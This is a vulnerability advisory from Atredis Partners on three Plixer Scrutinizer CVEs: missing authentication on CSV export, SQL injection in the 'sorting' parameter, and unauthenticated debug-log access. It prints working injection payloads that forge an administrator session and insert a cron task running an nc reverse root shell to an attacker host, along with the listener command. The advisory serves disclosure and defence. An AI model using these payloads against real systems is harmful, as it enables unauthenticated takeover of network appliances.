# Plixer - Scrutinizer Multiple Vulnerabilities

## Vendors

* Plixer

## Affected Products

Scrutinizer versions prior to 19.3.1

## Summary

The Plixer Scrutinizer appliance is susceptible to a multiple vulnerabilities when processing remote input from an unauthenticated user, leading to administrative command execution.

## Mitigation

Customers should upgrade to the version branch that addresses these vulnerabilities (19.2.2/19.3.2). Users should also consider restricting access to the Plixer Scrutinizer administrator interface to protected networks.

## Credit

This issue was found by Chris Bellows of Atredis Partners.

## Technical Details

### CVE-2023-41261 - Insufficient Authentication - csvExportReport

The `csvExportReport` endpoint action `generateCSV` does not require authentication and allows an unauthenticated user to export a report and access the results. The following request and response examples show how an unauthenticated user is able to export a CSV report:

```
POST /fcgi/scrut_fcgi.fcgi HTTP/1.1

```

***Unauthenticated Request to `generateCSV`***

```
HTTP/1.1 200 OK

{"filename":"statusReport_aaaaaaa_internalExternalSrc_1683740222572_inbound.csv"}
```

***Server Response Returning File Name for the Generated Report***

After obtaining the file name, an unauthetnicated user can access the report file under the path `/csv/status/`:

```
GET /csv/status/statusReport_aaaaaaa_internalExternalSrc_1683740222572_inbound.csv HTTP/1.1
Host: 192.168.1.240
Connection: close
```

"2","External","1.415 k","1683739740","1683739800",
```

***Server Response Containing Report Contents***

### CVE-2023-41262 - SQL Injection - csvExportReport

The `csvExportReport` endpoint action `generateCSV` is vulnerable to SQL injection through the `sorting` parameter, allowing an unauthenticated user to execute arbitrary SQL statements in the context of the application's backend database server. In the following request, the `sorting` parameter is assigned the `ATTACKER_CONTROLLED` value to demonstrate how that value propogates to a SQL statement executed on the application database server.

```
POST /fcgi/scrut_fcgi.fcgi HTTP/1.1
Host: 192.168.1.240
Content-Length: 1381
Connection: close

rm=csvExportReport&action=generateCSV&rpt_obj={"id":0,"reportTypeLang":"internalExternalSrc","saved":{"name":"aaaaaaa","id":"1"},"filters":{"sdfDips_0":"in_GROUP_ALL"},"reportDirections":{"selected":"x"},"times":{"start":"1683739700","end":"1683739800","dateRange":"Custom"},"rateTotal":{"available":["rate","total"],"selected":"total"},"dataGranularity":{"selected":"auto"},"ipDns":{"selected":"DNS"},"dataFormat":{"selected":"normal"},"orderBy":"countdistinct_sourceipaddress","tableView":{"hidden_cols":["","dddd"],"sorting":", ATTACKER_CONTROLLED","inbound":{"query_limit":{"offset":0,"max_num_rows":"10"}},"outbound":{"query_limit":{"offset":0,"max_num_rows":"10"}},"maxNumRows":"10"},"graphView":{"types":{"selected":"step"},"graphStyle":{"default":"stacked","available":["stacked","unstacked"],"selected":"stacked"},"graphGranularity":{"default":"medium","available":["low","medium","high"],"sizes":{"low":60,"high":180,"medium":"120"},"seconds":600,"selected":"medium"},"showOthers":true,"colHasBbp":0},"saveGlow":false,"useServerTz":0,"bbp":{"selected":"percent"},"every_column":0,"break_out_by_interface":0,"useTotalsTables":0,"table_only":0,"alternative_time_column":"","dataMode":{"selected":"raw_flows"},"colHasOther":0}&data_requested=%7B%22table_name%22%3A%22xyz%22%7D&direction=inbound&filename=statusReport_aaaaaaa_internalExternalSrc_1683740222572_inbound.csv
```

***Unauthenticated Request to `generateCSV` with `sorting` set to `ATTACKER_CONTROLLED`***

When a request to `generateCSV` is processed, the following query is executed by the database:

```
/* Get top x over all */
SELECT  min(conv.intervaltime) as first_flow_epoch,max(conv.intervaltime) as last_flow_epoch, max(conv.intervaltime) as
  intervaltime,
  conv.srcinternal,
  /*  conv.sourceipaddress, conv.srcinternal */
COUNT(DISTINCT sourceipaddress) AS countdistinct_sourceipaddress
FROM plixer_temp.rtt0x52f1f59af05511edbc4b2012328df036_inbound as conv
WHERE quantize( conv.intervaltime, 600 ) IN( 1683654000,……,1683739800 )
GROUP BY   conv.srcinternal
ORDER BY countdistinct_sourceipaddress , ATTACKER_CONTROLLED
NULLS LAST
LIMIT 10 OFFSET 0
```

***SQL Statement Executed by the Database When Processing `generateCSV` Requests***

As shown in the preceeding SQL snippet, the `ATTACKER_CONTROLLED` value is inserted into an `ORDER BY` statement without validation or sanitization resulting in classic SQL injection. This vulnerability can be leveraged to to perform a variety of attacks such as the impersonation of an administrator user. Following is an example attack where new administrator session is inserted into the application database with a `sessionid` cookie value of `1337133713371337`:

```
"sorting":" ,(SELECT 1 FROM dblink((select 'host=localhost user=plixer'), E'insert INTO plixer.sessions (session_id,user_id,auth_method,login_ts,update_ts) values (\'1337133713371337\',1,\'unpossible\',1683669820,1683847185)') RETURNS (result TEXT))--",
```

***`sorting` Parameter with SQL Injection Attack to Insert an Administrator User Session***

After the application executes the SQL injection statement, an unauthenticated user is able to access authenticated actions such as `checkSession` by including a `sessionid` cookie with the injected value of `1337133713371337` to impersonate an administrator:

```
POST /fcgi/scrut_fcgi.fcgi HTTP/1.1
Host: 192.168.1.240
Cookie: cookiesenabled=1; seenSkinModal=1; userid=1; sessionid=1337133713371337;
Connection: close
Content-Length: 31

rm=authInit&action=checkSession
```

***Accessing `checkSession` as an Administrator***

```
HTTP/1.1 200 OK

{"session":1}
```

***Server Response Confirming Authenticated Administrator Access***

In addition to impersonating privileged users, it was also possible to execute arbitrary commands on the system by injecting into the `tasks` database table. Entries in the `tasks` database table consist of system commands that can be executed on application server. To demonstrate the ability of an unauthenticated user to obtain remote command execution, the following payload was used to insert the command `sudo /bin/nc 192.168.1.239 443 --ssl -e /bin/sh` with a task identifier of `7777`:

```
"sorting":",(SELECT 1 FROM dblink((select 'host=localhost user=plixer'), E'insert into tasks values (7777,\\'myTaskName\\',\\'sudo\\',\\'[\"/bin/nc\",\"192.168.1.239\",\"443\",\"--ssl\",\"-e\",\"/bin/sh\"]\\',0,1,7,\\'plixer\\',\\'2023-05-09 19:00:01.742342\\')') RETURNS (result TEXT))--"
```

***Injecting a Task into the `tasks` Database Table***

Upon successful insertion of the above command into the `tasks` table, another injection attack was performed to add the task identifier (`7777`) into the `crontab` table for execution:

```
"sorting":",(SELECT 1 FROM dblink((select 'host=localhost user=plixer'), E'insert into crontab values (7777,1152921504606846975,16777215,0,0,0)') RETURNS (result TEXT))--"
```

***Injecting the `7777` Task Identifier into `crontab`***

The injected command directs the `nc` command on the application server to execute a reverse shell connection to an attacker controlled host (`192.168.1.239`) on port `443`. To receive the reverse shell, an SSL-encrypted listener was started on the attacker-controlled host. Upon execution of the `crontab` task, remote `root` shell access is granted as shown here:

```
[$]> ncat -lvkp 443 --ssl
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.

```

***Remote `root` Shell from Injected Task***

### CVE-2023-41263 - Debug Content Exposed

The Plixer Scrutinizer application also exposes debug logs to unauthenticated users at the `/debug/` URL path. Debug logs are stored in this directory with the format `IPADDRESS_ERROR_source.txt`, for example `192.168.1.240_ERROR_json_resp.txt`. With knowledge of valid IP addresses and `source` types, an unauthenticated attacker can download debug logs containing application-related information as demonstrated in the following request and respnse examples:

```
GET /debug/192.168.1.240_ERROR_json_resp.txt HTTP/1.1
Host: 172.16.2.143
Content-Length: 2
```

***Unauthenticated Request for a Debug Log***

```
HTTP/1.1 200 OK

```

***Server Response Containing the Contents of the Requested Log File***

In addition to debug log files with the `json_resp` source type, the following types of debug logs were also accessible without authentication:

* `get_default_or_first_map`
* `get_distributed_tables_from_collectors`
* `parseUrlFilter`
* `run`
* `columns_from_templates`
* `get_default_or_first_map`
* `get_distributed_tables_from_collectors`
* `parseUrlFilter`
* `report_get_finish_data`
* `return_menu`
